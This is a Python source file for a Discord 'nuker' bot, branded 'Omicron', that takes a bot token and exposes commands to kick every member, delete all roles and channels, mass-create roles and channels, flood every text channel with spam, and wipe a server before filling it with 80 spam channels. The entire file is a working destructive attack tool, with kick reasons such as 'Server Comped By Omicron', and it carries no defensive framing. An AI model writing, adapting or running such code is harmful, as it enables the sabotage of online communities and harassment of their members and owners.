from aero.intro import *

def spinner():
   print(Colorate.Horizontal(Colors.green_to_blue, Center.XCenter(nukebot)))
   token = input(f"{lr} Token {b}> {lr}")
   intents = discord.Intents.all()
   omi = commands.Bot(command_prefix="-", intents=intents)

   @omi.event
   async def on_ready():
      print(f"Omicron Nuker Ready to Exterminate. {omi.user}")

   @omi.command()
   @commands.has_permissions(kick_members=True)
   async def kickall(ctx):
      if ctx.guild is None:
         await ctx.send("Can be used in a server only.")
         return
      for member in ctx.guild.members:
         if member != ctx.author and member != omi.user:
            try:
               await member.kick(reason="Server Comped By Omicron 🦠")
               print(f'{lr}Kicked {b}{member.name}')
            except discord.Forbidden:
               await ctx.send(f"Unable to kick {member.name}")
            except discord.HTTPException:
               await ctx.send(f"Failed to kick {member.name}.")
         print(f"{lr} Kicked Everyone.")

   @omi.command()
   @commands.has_permissions(manage_roles=True)
   async def droles(ctx):
      guild = ctx.guild
      roles = guild.roles

      roles_to_delete = [role for role in roles if role.name != "@everyone"]

      if not roles_to_delete:
         print("No roles to delete.")
         return
      for role in roles_to_delete:
         try:
            await role.delete()
            print(f"{lr} Deleted {b}> {lr}{role.name}")
         except discord.Forbidden:
            print(f"Failed To Delete {role.name}")
         except discord.HTTPException as e:
            print(f"{lr} Cannot Delete Roles. Error : {b}{e}")
      print(f"{lr} Roles Exterminated.")

   @omi.command()
   @commands.has_permissions(manage_roles=True)
   async def croles(ctx, amount: int, *, name: str):
      if amount < 0:
         await ctx.send("A positive amount is to be specified.")
         return
      created_roles = []
      for i in range(amount):
         role_name = f"{name} {i + 1}"
         try:
            role = await ctx.guild.create_role(name=role_name)
            created_roles.append(role)
            print(f"Created role: {role.name}")
         except discord.Forbidden:
            await ctx.send(f"Missing Permissions - Omicron.")
            return
         except discord.HTTPException:
            await ctx.send(f"Failed - Omicron")
            return
         print("Created Roles.")

   @omi.command()
   @commands.has_permissions(manage_channels=True)
   async def create(ctx, amount: int, *, name: str):
      if amount <1:
         await ctx.send("Positive number is to be specified.")
         return
      guild = ctx.guild
      for i in range(amount):
         channel_name = f"{name}-{i+1}"
         await guild.create_text_channel(channel_name)
      print(f"Created {amount} channels.")

   @omi.command()
   @commands.has_permissions(manage_channels=True)
   async def ext(ctx):
      guild = ctx.guild
      channels = guild.channels

      if not channels:
         print(f"No channels were deleted as there aren't any to be found.")
         return
      for channel in channels:
         try:
            await channel.delete()
            print(f"{lr}{channel.name} {b}Deleted")
         except discord.Forbidden:
            print(f"{lr}Failed to delete channel {b}> {lr}{channel.name}")
         except discord.HTTPException:
            print(f"{lr}Failed to delete certain channel.")
      print(f"{lr} Channels were exterminated.")
   @omi.command()
   async def spam(ctx, message: str, amount: int):
      guild = ctx.guild
      channels = guild.text_channels

      if amount < 1:
         print("No text channels to be found")
         return
      for channel in channels:
         for _ in range(amount):
            try:
               await channel.send(message)
            except discord.Forbidden:
               print(f"{lr}Failed to send message to certain channels.")
            except discord.HTTPException as e:
               print(f"{lr} Failed to send message to certain channels.")
      print(f"{lr} Messages sent.")

   @omi.command()
   @commands.has_permissions(manage_channels=True)
   async def nuke(ctx, channel_name: str, *, message: str):
    for channel in ctx.guild.channels:
        await channel.delete()

    tasks = []
    for i in range(80):
        tasks.append(create_channel_and_send_message(ctx.guild, f"{channel_name}-{i+1}", message))

    await asyncio.gather(*tasks)

   async def create_channel_and_send_message(guild, channel_name, message):
    new_channel = await guild.create_text_channel(channel_name)
    
    # Send the message 7 times to the new channel
    for _ in range(7):
        await new_channel.send(message)

   omi.run(token)